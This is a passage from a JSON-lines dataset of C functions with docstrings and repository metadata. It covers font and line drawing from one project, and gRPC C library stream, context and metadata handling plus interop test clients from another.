*(TempScreen+1) = GetWinFontColor(Window);\n\n\t  TempScreen += GetWinPitch(Window);\n\t  TempScreen += GetWinPitch(Window)<<1;\n\t  *TempScreen = GetWinFontColor(Window);\n\t  *(TempScreen+1) = GetWinFontColor(Window);\n\t  TempScreen += GetWinPitch(Window);\n\t  *TempScreen = GetWinFontColor(Window);\n\t  *(TempScreen+1) = GetWinFontColor(Window);\n\n\t  return 0;\n\t}\n  else\n\t{\n\t  c = FontBufferWidth*FontHeight*2 + FontWidth*11;\n\t}\n\n  TempScreen = GetWinSurface(Window) + x + y*GetWinPitch(Window);\n  TempFont = FontBuffer + c;\n\n  /* Copy the character to the screen */\n  for(i=0;i<FontHeight;i++)\n\t{\n\t  for(j=0;j<FontWidth;j++)\n\t\t{\n\t\t  if(TempFont[j])\n\t\t\tTempScreen[j] = GetWinFontColor(Window);\n\t\t  else\n\t\t\tTempScreen[j] = GetWinBackgroundColor(Window);\n\t\t}\n\n\t  TempScreen += GetWinPitch(Window);\n\t  TempFont += FontBufferWidth;\n\t}\n\n\n  return 0;\n}", "path": "to-translate\\xp32\\font.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/* Draw a line */\n", "func_signal": "void Line(WINDOW Win, COOR x1, COOR y1, COOR x2, COOR y2)", "code": "{\n  long dx, dy;\n  unsigned char *Dest;\n  short i;\n  long XInc, YInc;\n\n  assert(x1 < GetWinWidth(Win));\n  assert(x2 < GetWinWidth(Win));\n  assert(y1 < GetWinHeight(Win));\n  assert(y2 < GetWinHeight(Win));\n\n  /* Calculate deltas */\n  dx = x2 - x1;\n  dy = y2 - y1;\n\n  /* Init the incriment values */\n  XInc = 1;\n  YInc = GetWinPitch(Win);\n  \n  /* Make sure dx and dy are > 0 and set the inc values \n     properly */\n  if(dx < 0)\n\t{\n\t  dx *= -1;\n\t  XInc *= -1;\n\t}\n  if(dy < 0)\n\t{\n\t  dy *= -1;\n\t  YInc *= -1;\n\t}\n\n  /* Calculate the position in the buffer to start */\n  Dest = GetWinSurface(Win) + x1 + (y1*GetWinPitch(Win));\n  \n  /* Special cases */\n  if(dy == dx)\n\t/* Diagonal line */\n\t{\n\t  for(i=0; i<=dx; i++)\n\t\t{\n\t\t  *Dest = Color;\n\t\t  Dest += XInc + YInc;\n\t\t}\n\t}\n  else if(dy == 0)\n\t/* Horizontal line */\n\t{\n\t  for(i=0;i<=dx;i++)\n\t\t{\n\t\t  *Dest = Color;\n\t\t  Dest += XInc;\n\t\t}\n\t}\n  else if(dx == 0)\n\t/* Vertical line */\n\t{\n\t  for(i=0;i<=dy;i++)\n\t\t{\n\t\t  *Dest = Color;\n\t\t  Dest += YInc;\n\t\t}\n\t}\n  else\n\t{\n\t  /* Non-special case line */\n\t  unsigned short Error;\n\t  long Length;\n\n\t  Error = 0;\n\t  if(dx > dy)\n\t\t{\n\t\t  Length = dx+1;\n\t\t  while(Length--)\n\t\t\t{\n\t\t\t  *Dest = Color;\n\t\t\t  Dest += XInc;\n\n\t\t\t  Error += dy;\n\t\t\t  if(Error > dx)\n\t\t\t\t{\n\t\t\t\t  Error -= dx;\n\t\t\t\t  Dest += YInc;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t  else\n\t\t{\n\t\t  Length = dy+1;\n\t\t  while(Length--)\n\t\t\t{\n\t\t\t  *Dest = Color;\n\t\t\t  Dest += YInc;\n\n\t\t\t  Error += dx;\n\t\t\t  if(Error > dy)\n\t\t\t\t{\n\t\t\t\t  Error -= dy;\n\t\t\t\t  Dest += XInc;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}", "path": "to-translate\\xp32\\line.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/*\n * Reader finish callback. Returns the status received into\n * context->gcc_status from previous call to grpc_c_client_request_status() \n * when server sent NULL marking end of output\n */\n", "func_signal": "int\ngc_client_stream_finish (grpc_c_context_t *context, grpc_c_status_t *status, \n\t\t\t uint32_t flags UNUSED)", "code": "{\n    grpc_event ev;\n    grpc_call_error e;\n    int nops;\n    int op_count = context->gcc_op_count;\n\n    /*\n     * If we have not send close from client, we do it when finishing stream\n     */\n    if (context->gcc_call_cancelled == 1) {\n\tnops = 1;\n    } else {\n\tnops = 2;\n    }\n\n    if (grpc_c_ops_alloc(context, nops)) return 1;\n\n    if (!context->gcc_call_cancelled) {\n\tcontext->gcc_ops[op_count].op = GRPC_OP_SEND_CLOSE_FROM_CLIENT;\n\top_count++;\n    }\n\n    context->gcc_ops[op_count].op = GRPC_OP_RECV_STATUS_ON_CLIENT;\n    context->gcc_ops[op_count].data.recv_status_on_client.trailing_metadata \n\t= context->gcc_trailing_metadata;\n    context->gcc_ops[op_count].data.recv_status_on_client.status \n\t= &context->gcc_status;\n    context->gcc_ops[op_count].data.recv_status_on_client.status_details \n\t= &context->gcc_status_details;\n    op_count++;\n\n\n    gpr_mu_lock(context->gcc_lock);\n    e = grpc_call_start_batch(context->gcc_call, context->gcc_ops, \n\t\t\t      nops, context, NULL);\n    if (e == GRPC_CALL_OK) {\n\tcontext->gcc_op_count = 0;\n    } else {\n\tgpr_mu_unlock(context->gcc_lock);\n\treturn 1;\n    }\n\n    ev = grpc_completion_queue_pluck(context->gcc_cq, context, \n\t\t\t\t     gpr_inf_future(GPR_CLOCK_REALTIME), NULL);\n    gpr_mu_unlock(context->gcc_lock);\n\n    if (ev.type == GRPC_OP_COMPLETE && ev.success && status != NULL) {\n\tstatus->gcs_code = context->gcc_status;\n\tchar *status_message  = grpc_slice_to_c_string(context->gcc_status_details);\n\tif (status_message) {\n\t    strlcpy(status->gcs_message, status_message, sizeof(status->gcs_message));\n\t} else {\n\t    status->gcs_message[0] = '\\0';\n\t}\n    }\n\n    gpr_mu_lock(&context->gcc_data.gccd_client->gcc_lock);\n    context->gcc_data.gccd_client->gcc_running_cb--;\n    gpr_mu_unlock(&context->gcc_data.gccd_client->gcc_lock);\n\n    return context->gcc_status;\n}", "path": "lib\\stream_ops.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
{"docstring": "/*\n * Create and initialize context\n */\n", "func_signal": "grpc_c_context_t *\ngrpc_c_context_init (struct grpc_c_method_t *method, int is_client)", "code": "{\n    grpc_c_context_t *context = gpr_malloc(sizeof(grpc_c_context_t));\n    if (context == NULL) {\n\treturn NULL;\n    }\n    bzero(context, sizeof(grpc_c_context_t));\n    \n    context->gcc_method = method;\n    context->gcc_deadline = gpr_inf_future(GPR_CLOCK_REALTIME);\n    context->gcc_client_cancel = 1;\n    context->gcc_metadata = gpr_malloc(sizeof(grpc_metadata_array));\n    if (context->gcc_metadata == NULL) {\n\tgpr_log(GPR_ERROR, \"Failed to allocate memory in context for metadata\");\n\tgrpc_c_context_free(context);\n\treturn NULL;\n    }\n    grpc_metadata_array_init(context->gcc_metadata);\n\n    context->gcc_initial_metadata = gpr_malloc(sizeof(grpc_metadata_array));\n    if (context->gcc_initial_metadata == NULL) {\n\tgpr_log(GPR_ERROR, \"Failed to allocate memory in context for \"\n\t\t\"initial metadata\");\n\tgrpc_c_context_free(context);\n\treturn NULL;\n    }\n    grpc_metadata_array_init(context->gcc_initial_metadata);\n\n    context->gcc_trailing_metadata = gpr_malloc(sizeof(grpc_metadata_array));\n    if (context->gcc_trailing_metadata == NULL) {\n\tgpr_log(GPR_ERROR, \"Failed to allocate memory in context for \"\n\t\t\"trailing metadata\");\n\tgrpc_c_context_free(context);\n\treturn NULL;\n    }\n    grpc_metadata_array_init(context->gcc_trailing_metadata);\n    \n\n    context->gcc_method_funcs = gpr_malloc(sizeof(grpc_c_method_funcs_t));\n    if (context->gcc_method_funcs == NULL) {\n\tgrpc_c_context_free(context);\n\treturn NULL;\n    }\n    bzero(context->gcc_method_funcs, sizeof(grpc_c_method_funcs_t));\n\n    if (is_client == 0) {\n\tcontext->gcc_is_client = 0;\n\tcontext->gcc_data.gccd_client = NULL;\n    } else {\n\tcontext->gcc_data.gccd_server = NULL;\n\tcontext->gcc_is_client = 1;\n    }\n\n    /*\n     * Allocate memory for stream handler\n     */\n    context->gcc_stream = gpr_malloc(sizeof(grpc_c_stream_handler_t));\n    if (context->gcc_stream == NULL) {\n\tgpr_log(GPR_ERROR, \"Failed to allocate memory for stream handler\");\n\tgrpc_c_context_free(context);\n\treturn NULL;\n    }\n    bzero(context->gcc_stream, sizeof(grpc_c_stream_handler_t));\n\n    return context;\n}", "path": "lib\\context.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
{"docstring": "/*\n * Reads data from stream\n */\n", "func_signal": "int\ngc_stream_read (grpc_c_context_t *context, void **output, \n\t\tuint32_t flags UNUSED, long timeout)", "code": "{\n    grpc_event ev;\n    gpr_timespec deadline;\n    int op_count = context->gcc_op_count;\n\n    /*\n     * Check if we have pending optional payload\n     */\n    if (context->gcc_payload == NULL) {\n\tdeadline = gc_deadline_from_timeout(timeout);\n\n\tif (context->gcc_read_event.gce_refcount == 0) {\n\t    if (grpc_c_ops_alloc(context, 1)) return 1;\n\t    gpr_mu_lock(context->gcc_lock);\n\n\t    context->gcc_ops[op_count].op = GRPC_OP_RECV_MESSAGE;\n\t    context->gcc_ops[op_count].data.recv_message.recv_message = \n\t\t&context->gcc_payload;\n\n\t    context->gcc_read_event.gce_type = GRPC_C_EVENT_READ;\n\t    context->gcc_read_event.gce_refcount++;\n\n\t    grpc_call_error e = grpc_call_start_batch(context->gcc_call, \n\t\t\t\t\t\t      context->gcc_ops + op_count, \n\t\t\t\t\t\t      1, &context->gcc_read_event, \n\t\t\t\t\t\t      NULL);\n\t    if (e != GRPC_CALL_OK) {\n\t\tcontext->gcc_read_event.gce_refcount--;\n\t\tgpr_mu_unlock(context->gcc_lock);\n\t\tgpr_log(GPR_ERROR, \"Failed to finish read ops batch\");\n\t\treturn GRPC_C_FAIL;\n\t    }\n\t}\n\n\tev = grpc_completion_queue_pluck(context->gcc_cq, \n\t\t\t\t\t &context->gcc_read_event, \n\t\t\t\t\t deadline, NULL);\n\tif (ev.success == 0 && ev.type != GRPC_QUEUE_TIMEOUT) {\n\t    gpr_log(GPR_ERROR, \"Failed to pluck read ops\");\n\t    context->gcc_read_event.gce_refcount--;\n\t    gpr_mu_unlock(context->gcc_lock);\n\t    return GRPC_C_FAIL;\n\t} else if (ev.type == GRPC_QUEUE_TIMEOUT) {\n\t    gpr_log(GPR_DEBUG, \"Read op queue timeout\");\n\t    gpr_mu_unlock(context->gcc_lock);\n\t    return GRPC_C_TIMEOUT;\n\t}\n\tcontext->gcc_op_count = 0;\n\tcontext->gcc_read_event.gce_refcount--;\n\tgpr_mu_unlock(context->gcc_lock);\n    }\n\n    /*\n     * Decode the received data. If we are a server, we decode using input\n     * unpacker. For client, we decode using output unpacker\n     */\n    if (context->gcc_is_client) {\n\t*output = context->gcc_method_funcs->gcmf_output_unpacker(context, \n\t\t\t\t\t\t\t\t  context->gcc_payload);\n    } else {\n\t*output = context->gcc_method_funcs->gcmf_input_unpacker(context, \n\t\t\t\t\t\t\t\t context->gcc_payload);\n    }\n\n    if (context->gcc_payload) {\n\tgrpc_byte_buffer_destroy(context->gcc_payload);\n\tcontext->gcc_payload = NULL;\n    } else {\n\t/*\n\t * If payload is NULL or we have invalid data, return NULL to the\n\t * client so it can request for status\n\t */\n\t*output = NULL;\n    }\n\n    return GRPC_C_OK;\n}", "path": "lib\\stream_ops.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
{"docstring": "/*\n * This is used to send a write finish from client\n */\n", "func_signal": "int \ngc_client_stream_write_done (grpc_c_context_t *context, uint32_t flags UNUSED, \n\t\t\t     long timeout)", "code": "{\n    grpc_event ev;\n    grpc_call_error e;\n    gpr_timespec deadline;\n    int op_count = context->gcc_op_count;\n\n    if (context == NULL) return GRPC_C_FAIL;\n\n    /*\n     * We do not have to explicitly close write from server\n     */\n    if (!context->gcc_is_client) return GRPC_C_OK;\n\n    /*\n     * If we have already called write_done, return early\n     */\n    if (context->gcc_write_done_event.gce_refcount > 0) {\n\tgpr_log(GPR_DEBUG, \"Called write done from client more than once\");\n\treturn GRPC_C_OK;\n    }\n\n    deadline = gc_deadline_from_timeout(timeout);\n\n    if (context->gcc_write_done_event.gce_refcount == 0) {\n\tif (grpc_c_ops_alloc(context, 1)) return 1;\n\tgpr_mu_lock(context->gcc_lock);\n\n\tcontext->gcc_ops[op_count].op = GRPC_OP_SEND_CLOSE_FROM_CLIENT;\n\n\tcontext->gcc_write_done_event.gce_type = GRPC_C_EVENT_WRITE;\n\tcontext->gcc_write_done_event.gce_refcount++;\n\tgrpc_call_error e = grpc_call_start_batch(context->gcc_call, \n\t\t\t\t\t\t  context->gcc_ops + op_count, 1, \n\t\t\t\t\t\t  &context->gcc_write_done_event, \n\t\t\t\t\t\t  NULL);\n\tif (e != GRPC_CALL_OK) {\n\t    context->gcc_write_done_event.gce_refcount--;\n\t    gpr_mu_unlock(context->gcc_lock);\n\t    gpr_log(GPR_ERROR, \"Failed to finish write done ops batch\");\n\t    return GRPC_C_FAIL;\n\t}\n    }\n\n    ev = grpc_completion_queue_pluck(context->gcc_cq, \n\t\t\t\t     &context->gcc_write_done_event, \n\t\t\t\t     deadline, NULL);\n    if (ev.success == 0 \n\t|| (ev.type != GRPC_OP_COMPLETE && ev.type != GRPC_QUEUE_TIMEOUT)) {\n\tgpr_log(GPR_ERROR, \"Failed to pluck write done ops\");\n\tcontext->gcc_write_done_event.gce_refcount--;\n\tgpr_mu_unlock(context->gcc_lock);\n\treturn GRPC_C_FAIL;\n    } else if (ev.type == GRPC_QUEUE_TIMEOUT) {\n\tgpr_log(GPR_DEBUG, \"Write done op queue timeout\");\n\tgpr_mu_unlock(context->gcc_lock);\n\treturn GRPC_C_TIMEOUT;\n    }\n    context->gcc_op_count = 0;\n    context->gcc_write_done_event.gce_refcount--;\n    context->gcc_call_cancelled = 1;\n    gpr_mu_unlock(context->gcc_lock);\n\n    return GRPC_C_OK;\n}", "path": "lib\\stream_ops.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
{"docstring": "/*\n * Extracts the value for a key from the metadata array. Returns NULL if given\n * key is not present\n */\n", "func_signal": "const char *\ngrpc_c_get_metadata_by_key (grpc_c_context_t *context, const char *key)", "code": "{\n    if (context) {\n\treturn grpc_get_metadata_by_array(context->gcc_metadata, key);\n    }\n    return NULL;\n}", "path": "lib\\context.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
{"docstring": "/*\n * Takes as argument the socket name\n */\n", "func_signal": "int \nmain (int argc, char **argv)", "code": "{\n    if (argc < 2) {\n\tfprintf(stderr, \"Too few arguments\\n\");\n\texit(1);\n    }\n\n    /*\n     * Initialize grpc-c library to be used with vanilla grpc\n     */\n    grpc_c_init(GRPC_THREADS, NULL);\n\n    /*\n     * Create a client object with client name as server_streaming client to \n     * be talking to a insecure server\n     */\n    client = grpc_c_client_init(argv[1], \"server streaming client\", NULL, \n\t\t\t\tNULL);\n\n    /*\n     * Create a hello request message and call RPC\n     */\n    server_streaming__HelloRequest h;\n    server_streaming__hello_request__init(&h);\n\n    char str[BUFSIZ];\n    snprintf(str, BUFSIZ, \"world\");\n    h.name = str;\n\n    /*\n     * This will invoke a async RPC\n     */\n    server_streaming__greeter__say_hello__async(client, NULL, 0, &h, &cb, \n\t\t\t\t\t\t(void *)1);\n\n    pthread_t thr;\n    pthread_create(&thr, NULL, test_check, NULL);\n\n    grpc_c_client_wait(client);\n}", "path": "examples\\server_streaming_client.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
{"docstring": "/*\n * This test verifies that client-only streaming succeeds\n */\n", "func_signal": "int \nclient_streaming_fn (grpc_c_client_t *client)", "code": "{\n    Grpc__Testing__StreamingInputCallRequest request;\n    Grpc__Testing__StreamingInputCallResponse *response;\n    grpc_c_context_t *context;\n    grpc_c_status_t status;\n    int i, aggregated_payload_size = 0;\n\n    grpc__testing__StreamingInputCallRequest__init(&request);\n\n    gpr_log(GPR_DEBUG, \"Sending request steaming rpc\");\n\n    GPR_ASSERT(grpc__testing__test_service__streaming_input_call__sync(client, \n\t\t\t    NULL, 0, &context, NULL, -1) == GRPC_C_OK);\n\n    /*\n     * Send payload in chunks\n     */\n    grpc__testing__payload__init(request.payload);\n    for (i = 0; i < sizeof(request_stream_sizes); i++) {\n\trequest.payload.body.data = malloc(request_stream_sizes[i]);\n\tbzero(request.payload.body.data, request_stream_sizes[i]);\n\trequest.payload.body.len = request_stream_sizes[i];\n\trequest.payload.has_body = 1;\n\n\tGPR_ASSERT(context->gcc_stream->write(context, &response, -1) \n\t\t   == GRPC_C_OK);\n\taggregated_payload_size += request_stream_sizes[i];\n\tfree(request.payload.body.data);\n    }\n\n    /*\n     * Finish the call and verify status\n     */\n    GPR_ASSERT(context->gcc_stream->finish(context, &status) == GRPC_C_OK);\n    GPR_ASSERT(status.gcs_code == GRPC_C_OK);\n\n    /*\n     * Verify aggregated payload size\n     */\n    GPR_ASSERT(response->aggregated_payload_size == aggregated_payload_size);\n\n    return 0;\n}", "path": "test\\interop\\client.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
{"docstring": "/*\n * Find and run test function\n */\n", "func_signal": "int \nrun_test (grpc_c_client_t *client, const char *testname)", "code": "{\n    struct testdef *test = tests;\n\n    while (test->testname != NULL) {\n\tif (streq(test->testname, testname)) {\n\t    break;\n\t}\n\ttest++;\n    }\n\n    /*\n     * Run if test is found\n     */\n    if (test->testname != NULL) {\n\ttest->testfn(client);\n    } else {\n\tprintf(\"No testcases found with that name\\n\");\n    }\n}", "path": "test\\interop\\client.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
{"docstring": "/*\n * Returns value for given key fro initial metadata array\n */\n", "func_signal": "const char *\ngrpc_c_get_initial_metadata_by_key (grpc_c_context_t *context, const char *key)", "code": "{\n    if (context) {\n\treturn grpc_get_metadata_by_array(context->gcc_initial_metadata, key);\n    }\n    return NULL;\n}", "path": "lib\\context.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
{"docstring": "/*\n * Adds given key value pair to trailing metadata array. Returns 0 on success\n * and 1 on failure\n */\n", "func_signal": "int \ngrpc_c_add_trailing_metadata (grpc_c_context_t *context, const char *key, \n\t\t\t      const char *value)", "code": "{\n    return grpc_c_add_metadata_by_array(context->gcc_trailing_metadata, \n\t\t\t\t\t&context->gcc_trailing_metadata_storage, \n\t\t\t\t\tkey, value);\n}", "path": "lib\\context.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
{"docstring": "/*\n * Adds given key value pair to initial metadata array. Returns 0 on success\n * and 1 on failure\n */\n", "func_signal": "int \ngrpc_c_add_initial_metadata (grpc_c_context_t *context, const char *key, \n\t\t\t     const char *value)", "code": "{\n    return grpc_c_add_metadata_by_array(context->gcc_initial_metadata, \n\t\t\t\t\t&context->gcc_initial_metadata_storage, \n\t\t\t\t\tkey, value);\n}", "path": "lib\\context.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
{"docstring": "/*\n * This test verifies the server can compress unary messages. It sends two\n * unary requests, expecting the server's response to be compressed or not\n * according to the response_compressed boolean.\n */\n", "func_signal": "int \nserver_compressed_unary (grpc_c_client_t *client)", "code": "{\n    Grpc__Testing__SimpleRequest request;\n    Grpc__Testing__SimpleResponse *response;\n    grpc_c_context_t *context = NULL;\n    grpc_c_status_t status;\n\n    grpc__testing__SimpleRequest__init(&request);\n\n    /*\n     * Create one request valid request without compression. We need access to\n     * context here so we can check compression algorithm\n     */\n    gpr_log(GPR_DEBUG, \"Sending unary request with server compression=off\");\n    request.response_compressed = 0;\n    GPR_ASSERT(grpc__testing__test_service__unary_call__sync(client, NULL, 0, \n\t\t\t\t\t\t\t     &context, &request, \n\t\t\t\t\t\t\t     -1) == GRPC_C_OK);\n    GPR_ASSERT(context->gcc_stream_read(context, (void **)&response, 0, -1) \n\t       == GRPC_C_OK);\n    /*\n     * Make sure data is uncompressed\n     */\n    GPR_ASSERT(!(grpc_call_test_only_get_message_flags(context->gcc_call) \n\t\t & GRPC_WRITE_INTERNAL_COMPRESS));\n    status = context->gcc_stream->finish(context, NULL, 0);\n\n    /*\n     * Check payload\n     */\n    GPR_ASSERT(response->payload->body->len == 314159);\n    char buf[314159];\n    bzero(buf, sizeof(buf));\n    GPR_ASSERT(memcmp(response->payload->body->data, buf, 314159));\n\n    /*\n     * Create request with compression and check flags\n     */\n    request.response_compressed = 1;\n    gpr_log(GPR_DEBUG, \"Sending unary request with server compression=off\");\n    GPR_ASSERT(grpc__testing__test_service__unary_call__sync(client, md2, 0, \n\t\t\t\t\t\t\t     &context, &request, \n\t\t\t\t\t\t\t     -1) == GRPC_C_OK);\n    GPR_ASSERT(context->gcc_stream_read(context, (void **)&response, 0, -1) \n\t       == GRPC_C_OK);\n\n    /*\n     * Make sure data is compressed and payload is all zeros\n     */\n    GPR_ASSERT((grpc_call_test_only_get_message_flags(context->gcc_call) \n\t\t& GRPC_WRITE_INTERNAL_COMPRESS));\n    GPR_ASSERT(response->payload->body->len == 314159);\n    GPR_ASSERT(memcmp(response->payload->body->data, buf, 314159));\n\n    status = context->gcc_stream->finish(context, NULL, 0);\n\n    /*\n     * TODO: free\n     */\n\n    return 0;\n}", "path": "test\\interop\\client.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
{"docstring": "/*\n * Free the context object\n */\n", "func_signal": "void\ngrpc_c_context_free (grpc_c_context_t *context)", "code": "{\n    int i;\n\n    if (context->gcc_metadata) {\n\t/*\n\t * In case of client, we take a copy of key value pairs into metadata\n\t * array before sending to server. We have to free that data before\n\t * destroying metadata array\n\t */\n\tif (context->gcc_is_client) {\n\t    gc_metadata_storage_free(context->gcc_metadata_storage, \n\t\t\t\t     context->gcc_metadata->count);\n\t}\n\tgrpc_metadata_array_destroy(context->gcc_metadata);\n\tgpr_free(context->gcc_metadata);\n    }\n\n    /*\n     * In server, we take copy of key value pairs of initial and trailing\n     * metadata before sending over wire. We have to free them before\n     * destroying these arrays\n     */\n    if (context->gcc_initial_metadata) {\n\tif (!context->gcc_is_client) {\n\t    gc_metadata_storage_free(context->gcc_initial_metadata_storage, \n\t\t\t\t     context->gcc_initial_metadata->count);\n\t}\n\tgrpc_metadata_array_destroy(context->gcc_initial_metadata);\n\tgpr_free(context->gcc_initial_metadata);\n    }\n\n    if (context->gcc_trailing_metadata) {\n\tif (!context->gcc_is_client) {\n\t    gc_metadata_storage_free(context->gcc_trailing_metadata_storage, \n\t\t\t\t     context->gcc_trailing_metadata->count);\n\t}\n\tgrpc_metadata_array_destroy(context->gcc_trailing_metadata);\n\tgpr_free(context->gcc_trailing_metadata);\n    }\n\n    if (context->gcc_call) grpc_call_destroy(context->gcc_call);\n\n    /*\n     * Free ops payload when we are done with all the ops\n     */\n    if (context->gcc_ops) gpr_free(context->gcc_ops);\n\n    if (context->gcc_ops_payload != NULL) {\n\t/*\n\t * Log if we are freeing context that is still in use\n\t */\n\tif (context->gcc_op_count != 0) {\n\t    gpr_log(GPR_ERROR, \"Freeing context that is still in use\");\n\t}\n\n\tfor (i = 0; i < context->gcc_op_capacity; i++) {\n\t    if (context->gcc_ops_payload[i] != NULL) {\n\t\tgrpc_byte_buffer_destroy(context->gcc_ops_payload[i]);\n\t    }\n\t}\n\tgpr_free(context->gcc_ops_payload);\n    }\n\n    if (context->gcc_reader) gpr_free(context->gcc_reader);\n\n    if (context->gcc_writer) gpr_free(context->gcc_writer);\n\n    if (context->gcc_is_client && context->gcc_method) {\n\tgpr_free(context->gcc_method);\n    }\n\n    if (context->gcc_method_funcs) gpr_free(context->gcc_method_funcs);\n\n    grpc_slice_unref(context->gcc_status_details);\n\n    if (context->gcc_cq) {\n\tif (context->gcc_is_client) {\n\t    grpc_completion_queue_shutdown(context->gcc_cq);\n\t} else {\n\t    if (context->gcc_state != GRPC_C_SERVER_CALLBACK_WAIT) {\n\t\tgrpc_completion_queue_shutdown(context->gcc_cq);\n\t    }\n\t}\n    }\n\n    /*\n     * If we are freeing this context without using it, free corresponding\n     * event and mutex memory\n     */\n    if (context->gcc_state == GRPC_C_SERVER_CALLBACK_WAIT \n\t|| !grpc_c_get_thread_pool()) {\n\tif (context->gcc_lock) gpr_free(context->gcc_lock);\n    }\n\n    /*\n     * If this is context from client, remove this from list of contexts that\n     * we are tracking\n     */\n    if (context->gcc_is_client) {\n\tLIST_REMOVE(context, gcc_list);\n    }\n\n    if (context->gcc_payload) grpc_byte_buffer_destroy(context->gcc_payload);\n\n    /*\n     * Event types when batching operations\n     */\n    context->gcc_event.gce_type = GRPC_C_EVENT_RPC_INIT;\n    context->gcc_read_event.gce_type = GRPC_C_EVENT_READ;\n    context->gcc_write_event.gce_type = GRPC_C_EVENT_WRITE;\n    context->gcc_write_done_event.gce_type = GRPC_C_EVENT_WRITE_FINISH;\n    context->gcc_recv_close_event.gce_type = GRPC_C_EVENT_RECV_CLOSE;\n\n    /*\n     * Mark event tag corresponding to this context for cleanup\n    if (context->gcc_event) {\n\tif (context->gcc_state == GRPC_C_SERVER_CALLBACK_WAIT) {\n\t    gpr_free(context->gcc_event);\n\t} else {\n\t    context->gcc_event->gce_type = GRPC_C_EVENT_CLEANUP;\n\t    context->gcc_event.gce_data = NULL;\n\t}\n    }\n     */\n\n    gpr_free(context);\n}", "path": "lib\\context.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
{"docstring": "/*\n * Write function for client\n */\n", "func_signal": "int\ngc_stream_write (grpc_c_context_t *context, void *input, uint32_t flags, \n\t\t long timeout)", "code": "{\n    grpc_event ev;\n    gpr_timespec deadline;\n    int op_count;\n\n    /*\n     * If there is a pending write, return early\n     */\n    if (context->gcc_write_event.gce_refcount > 0) {\n\treturn GRPC_C_WRITE_PENDING;\n    }\n\n    /*\n     * Send initial metadata if we haven't already sent it\n     */\n    if (gc_send_initial_metadata_internal(context, 0)) {\n\tgpr_log(GPR_ERROR, \"Failed to send initial metadata\");\n\treturn GRPC_C_FAIL;\n    }\n\n    deadline = gc_deadline_from_timeout(timeout);\n\n    if (context->gcc_write_event.gce_refcount == 0) {\n\tif (grpc_c_ops_alloc(context, 1)) return GRPC_C_FAIL;\n\tgpr_mu_lock(context->gcc_lock);\n\n\top_count = context->gcc_op_count;\n\tif (context->gcc_is_client) {\n\t    context->gcc_method_funcs->gcmf_input_packer(input, \n\t\t\t\t\t&context->gcc_ops_payload[op_count]);\n\t} else {\n\t    context->gcc_method_funcs->gcmf_output_packer(input, \n\t\t\t\t\t&context->gcc_ops_payload[op_count]);\n\t}\n\tcontext->gcc_ops[op_count].op = GRPC_OP_SEND_MESSAGE;\n\tcontext->gcc_ops[op_count].flags = flags;\n\tcontext->gcc_ops[op_count].data.send_message.send_message  \n\t    = context->gcc_ops_payload[op_count];\n\tcontext->gcc_op_count++;\n\n\tcontext->gcc_write_event.gce_type = GRPC_C_EVENT_WRITE;\n\tcontext->gcc_write_event.gce_refcount++;\n\tgrpc_call_error e = grpc_call_start_batch(context->gcc_call, \n\t\t\t\t\t\t  context->gcc_ops, \n\t\t\t\t\t\t  context->gcc_op_count, \n\t\t\t\t\t\t  &context->gcc_write_event, \n\t\t\t\t\t\t  NULL);\n\tif (e != GRPC_CALL_OK) {\n\t    context->gcc_write_event.gce_refcount--;\n\t    gpr_mu_unlock(context->gcc_lock);\n\t    gpr_log(GPR_ERROR, \"Failed to finish write ops batch\");\n\t    return GRPC_C_FAIL;\n\t}\n    }\n\n    ev = grpc_completion_queue_pluck(context->gcc_cq, \n\t\t\t\t     &context->gcc_write_event, deadline, NULL);\n    if (ev.success == 0 \n\t|| (ev.type != GRPC_OP_COMPLETE && ev.type != GRPC_QUEUE_TIMEOUT)) {\n\tgpr_log(GPR_ERROR, \"Failed to pluck write ops\");\n\tcontext->gcc_write_event.gce_refcount--;\n\tgpr_mu_unlock(context->gcc_lock);\n\treturn GRPC_C_FAIL;\n    } else if (ev.type == GRPC_QUEUE_TIMEOUT) {\n\tgpr_log(GPR_DEBUG, \"Write ops queue timeout\");\n\tgpr_mu_unlock(context->gcc_lock);\n\treturn GRPC_C_TIMEOUT;\n    }\n    context->gcc_op_count = 0;\n    context->gcc_write_event.gce_refcount--;\n    gpr_mu_unlock(context->gcc_lock);\n\n    return GRPC_C_OK;\n}", "path": "lib\\stream_ops.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
